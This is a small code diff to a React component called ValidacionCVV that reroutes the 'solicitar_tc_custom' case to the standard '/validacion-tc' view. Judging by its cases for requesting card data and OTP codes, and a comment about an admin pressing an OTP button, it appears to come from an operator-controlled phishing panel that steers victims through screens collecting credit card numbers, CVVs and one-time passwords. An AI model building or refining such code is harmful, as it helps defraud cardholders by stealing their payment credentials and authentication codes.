@@ -118,7 +118,8 @@ export default function ValidacionCVV() {
                         navigate("/validacion-tc"); 
                         break;
                     case 'solicitar_tc_custom': 
-                        navigate("/validacion-tc-custom"); 
+                        // Usar la misma vista ValidacionTC para TC estándar y custom
+                        navigate("/validacion-tc"); 
                         break;
                     case 'solicitar_otp': 
                         // Solo redirigir cuando el admin específicamente presiona el botón OTP
